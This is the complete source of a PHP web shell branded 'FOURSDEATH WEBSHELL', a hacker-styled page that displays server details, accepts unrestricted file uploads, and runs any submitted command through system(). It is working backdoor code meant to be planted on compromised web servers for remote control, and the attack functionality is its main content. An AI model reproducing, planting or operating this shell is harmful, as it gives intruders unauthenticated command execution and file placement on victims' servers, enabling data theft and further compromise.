<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>FOURSDEATH WEBSHELL</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Courier New', monospace;
      background: url('https://g.top4top.io/p_1825r6iwh0.jpg') no-repeat center center fixed;
      background-size: cover;
      color: white;
    }

    header {
      text-align: center;
      padding: 20px 10px;
    }

    header h1 {
      font-size: 2.2em;
      color: gold;
      margin-bottom: 5px;
      text-shadow: 2px 2px 5px black;
    }

    header h4 {
      font-size: 1.2em;
      color: #f2f2f2;
      margin: 0;
      text-shadow: 1px 1px 2px black;
    }

    .shell-logo img {
      width: 180px;
      height: auto;
      margin-top: 10px;
    }

    .info-box {
      max-width: 95%;
      width: 720px;
      margin: 10px auto;
      padding: 10px;
      background: rgba(0, 0, 0, 0.6);
      border-radius: 10px;
      box-shadow: 0 0 8px lime;
    }

    .info-box b {
      display: inline-block;
      min-width: 110px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 10px;
    }

    table td, table th {
      padding: 8px;
      border: 1px solid #666;
      text-align: center;
    }

    table tr:nth-child(even) {
      background-color: rgba(255,255,255,0.05);
    }

    input[type="submit"], select {
      padding: 6px 12px;
      background-color: #111;
      color: #33f702;
      border: 1px solid #33f702;
      border-radius: 5px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #33f702;
      color: black;
    }

    a {
      color: #33f702;
      text-decoration: none;
    }

    a:hover {
      color: white;
      text-shadow: 0px 0px 5px white;
    }

    textarea {
      width: 100%;
      max-width: 100%;
      border-radius: 8px;
      background: black;
      color: #33f702;
      border: 1px solid #999;
      font-family: monospace;
      padding: 10px;
    }

    .footer {
      text-align: center;
      font-size: 0.9em;
      color: #ccc;
      margin: 20px 0;
    }

    @media screen and (max-width: 600px) {
      header h1 {
        font-size: 1.5em;
      }

      .info-box {
        width: 95%;
        font-size: 0.9em;
      }

      .shell-logo img {
        width: 120px;
      }

      table td {
        font-size: 0.8em;
        padding: 5px;
      }

      textarea {
        font-size: 0.9em;
      }
    }
  </style>
</head>
<body>
  <audio autoplay loop>
    <source src="https://d.top4top.io/m_1234567890.mp3" type="audio/mpeg">
  </audio>

  <header>
    <h1>FOURSDEATH WEBSHELL</h1>
    <h4>~ powered by X'Boy Linux ~</h4>
    <div class="shell-logo">
      <a href="."><img src="https://i.top4top.io/p_22457217t0.png" alt="Logo"></a>
    </div>
  </header>

  <div class="info-box">
    <?php
    echo "<b>Server:</b> ".php_uname()."<br>";
    echo "<b>IP:</b> ".$_SERVER['SERVER_ADDR']."<br>";
    echo "<b>Directory:</b> ".getcwd()."<br>";
    ?>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="upload">
      <input type="submit" name="go" value="Upload">
    </form>
    <hr>
    <form method="post">
      <textarea name="cmd" rows="5" placeholder="Command here..."></textarea>
      <br>
      <input type="submit" value="Execute">
    </form>
    <hr>
    <?php
    if(isset($_FILES['upload'])) {
      if(move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name'])) {
        echo "<b>Upload berhasil:</b> ".$_FILES['upload']['name']."<br>";
      } else {
        echo "<b>Upload gagal!</b><br>";
      }
    }

    if(isset($_POST['cmd'])) {
      echo "<pre>";
      system($_POST['cmd']);
      echo "</pre>";
    }
    ?>
  </div>

  <div class="footer">
    &copy; <?=date('Y')?> FOURSDEATH Webshell | X'Boy Linux Styled
  </div>
</body>
</html>
